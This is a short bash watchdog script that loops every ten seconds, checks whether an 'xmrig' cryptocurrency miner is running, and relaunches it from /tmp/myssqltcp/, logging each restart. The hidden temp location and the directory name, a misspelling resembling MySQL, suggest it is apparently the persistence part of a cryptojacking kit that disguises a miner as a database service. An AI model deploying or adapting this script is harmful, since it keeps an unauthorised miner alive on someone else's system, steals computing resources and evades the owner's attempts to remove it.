#!/bin/bash

VERSION=2.11
while true
do
ps -ef | grep "xmrig" | grep -v "grep"
if [ "$?" -eq 1 ]
then

echo "$(date "+%Y-%m-%d_%H:%M:%S") restart..." >> /tmp/timelog.log

cd /tmp/myssqltcp/ && ./xmrig.sh
fi
# 每10秒检查一次
sleep 10
done
